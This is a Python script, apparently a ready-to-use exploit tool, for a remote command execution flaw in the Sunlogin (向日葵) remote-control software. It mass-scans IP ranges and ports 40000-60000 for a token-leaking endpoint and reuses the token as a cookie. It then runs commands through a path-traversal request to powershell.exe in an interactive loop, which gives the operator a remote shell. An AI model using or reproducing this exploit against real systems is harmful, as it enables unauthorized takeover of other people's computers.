#encoding=utf-8
import threading
import getopt
import sys
from IPy import IP
import requests
import json

#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def scan_poc(ip, port):
	headers={
 	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36'
	}
	url ="http://"+str(ip) + ":"+str(port) +"/cgi-bin/rpc?action=verify-haras"
	try :
		req = requests.get(url,headers=headers, timeout=7)
		data = json.loads(req.text)
		print(data,type(repr(data)))
		print(data["verify_string"])
		CID = data["verify_string"]
		print(url+"存在向日葵漏洞")
		return CID
	except:
		return "null"
def exp_poc(ip, port):
	CID = scan_poc(ip, port)
	print(CID)
	if CID == "null":
		print(str(ip)+"不存在漏洞，也可能是已关闭")
		return
	cmd = "whoami"
	url = "http://"+str(ip) + ":"+str(port) +"/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+" + cmd
	Cookie ="CID=" + CID
	headers={
 	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36',
 	'Cookie': Cookie
	}
	req = requests.get(url, headers=headers,timeout=30)
	if req.text.find("error")>-1:
		print(req.text.find("error"))
		print("WindowsPowerShell不可用，尝试使用windows/system32/.....")
		url = "http://"+str(ip) + ":"+str(port) +"/check?cmd=ping../../../../../../../../../../windows/system32/"
		req = requests.get(url, headers=headers,timeout=30)
		while 1:
			cmd=input("输入命令：")
			url = "http://"+str(ip) + ":"+str(port) +"/check?cmd=ping../../../../../../../../../../windows/system32/" + cmd
			req = requests.get(url, headers=headers,timeout=30)
			print(str(req.content.decode('gbk')))
	while 1:
		cmd=input("输入命令：")
		url = "http://"+str(ip) + ":"+str(port) +"/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+" + cmd
		req = requests.get(url, headers=headers,timeout=30)
		print(str(req.content.decode('gbk')))	
	#urlpoc = url +"/check?cmd=ping../../../../../../../../../../windows/system32/" + cmd
	#req = requests.get(url, headers=headers,proxies=proxies,timeout=30)
	#req = requests.get(str(urlpoc), headers=headers,timeout=30)
	#req.encoding = req.apparent_encoding
	#print(str(req.content.decode('gbk')))

def main(argv):
	try:
		options, args = getopt.getopt(argv, "hp:i:p:f:", ["help", "ip=", "port="])
	except getopt.GetoptError:
		sys.exit()	
	ip = "null"
	port = "40000-60000"
	fexpscan = "scan"
	thread = 50
	for option, value in options:
		if option in ("-h", "--help"):
	 		print("-i    --ip               指定IP地址")
	 		print("-p   --port           指定端口，默认40000-60000")
	 		print("-f   --fexpscan     scan or exp    默认扫描，扫描 or 利用")
	 		print("-t    --thread       指定线程，默认50")
		if option in ("-i", "--ip"):
			ip = value
		if option in ("-p", "--port"):
			port = value
		if option in ("-f", "--fexpscan"):
			fexpscan = value
		if option in ("-t", "--thread"):
			thread = value
	print("qqq")
	if ip == "null":
		print("ip不能为空")
		return
	print(fexpscan)
	print("qqq")
	if fexpscan == "exp":
		print('exxx')
		exp_poc(ip,port)
		return
	if fexpscan == "scan":
		#if ip find('-')== -1	
		ip = IP(ip,make_net=True)
		port1 = port.split('-')
		print(port1[0])
		port1[0] = int(port1[0])
		port1[1] = int(port1[1])
		for i in ip:
			print(i)
			while port1[0]< port1[1]:
				main_thread = threading.Thread(target=scan_poc,args=(ip,port1[0],))
				main_thread.start()
				port1[0]=port1[0]+1
				while 1:
					if(len(threading.enumerate()) < thread):
						break
		return
		
if __name__ == '__main__':
	main(sys.argv[1:])
